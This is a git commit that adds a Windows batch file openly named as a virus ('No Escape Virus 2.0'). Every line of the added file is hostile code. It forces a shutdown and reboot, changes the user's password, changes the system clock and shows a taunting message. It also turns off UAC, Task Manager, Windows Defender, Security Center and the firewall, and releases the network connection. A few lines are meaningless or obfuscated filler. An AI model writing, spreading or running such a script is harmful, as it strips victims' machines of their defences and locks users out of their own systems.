9d80ba5b39081856f60d5a1eb9d2deb2eb3cecfa
Kubas431 <kuba80269@gmail.com>
2024-09-14 11:03:52 +0200

    Create No Escape Virus 2.0.bat

---
+++ No Escape Virus 2.0.bat
@@ -0,0 +1,25 @@
+@echo off
+shutdown -s -t 2 -c "No Escape"
+net user %username% *
+Death
+Death
+start charmap.exe
+echo Msgbox"Your system death:( Your system death Your system death Your system death",0+1,"No Escape 2.0">>msg.vbs
+start msg.vbs
+date 22/08/2014
+time 06:06:06
+@Set RegistyEditCmd=Cmd /k Reg Add
+@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
+@Echo off & @@Break Off
+Ipconfig / release
+%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!
+P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+net stop "SDRSVC"
+net stop "WinDefend"
+taskkill /f /t /im "MSASCui.exe"
+net stop "security center"
+net stop sharedaccess
+netsh firewall set opmode mode-disable
+shutdown /r
